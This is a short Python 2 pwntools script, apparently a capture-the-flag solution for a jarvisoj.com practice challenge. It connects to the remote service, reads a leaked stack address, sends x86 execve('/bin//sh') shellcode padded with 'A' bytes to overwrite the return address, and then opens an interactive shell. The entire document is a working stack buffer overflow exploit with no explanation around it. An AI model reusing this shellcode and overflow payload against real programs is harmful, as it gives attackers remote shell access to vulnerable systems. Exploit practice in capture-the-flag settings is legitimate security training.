from pwn import *

p = remote('pwn2.jarvisoj.com', 9877)
buf = p.recv(100)
shellcode_addr = int(buf.split(":")[1].split('?')[0][2:], 16)
print shellcode_addr
sc =  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
sc += "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
sc += "\x80"
payload = sc + 'A' * (140-len(sc)) + p32(shellcode_addr)
p.send(payload)
p.interactive()
